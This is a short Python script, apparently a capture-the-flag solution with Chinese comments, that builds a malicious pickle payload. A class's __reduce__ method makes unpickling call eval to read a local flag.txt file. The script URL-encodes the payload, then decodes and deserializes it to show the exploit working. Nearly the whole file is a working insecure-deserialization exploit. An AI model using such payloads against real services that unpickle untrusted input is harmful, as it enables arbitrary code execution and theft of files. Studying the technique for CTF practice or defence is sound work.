import pickle
import builtins
import base64
import urllib


class EvilPickle:
    def __reduce__(self):
        return (builtins.eval, ("open('./flag.txt', 'r').read()",))

# 序列化EvilPickle实例
attack_bytes = pickle.dumps(EvilPickle())
attack_urlcode = urllib.parse.quote(attack_bytes)

# 反序列化示例
try:
    attack_urldecode = urllib.parse.unquote_to_bytes(attack_urlcode)
    flag = pickle.loads(attack_urldecode)
    # 打印结果
    print("Flag:", flag)
except Exception as e:
    print("An error occurred:", e)
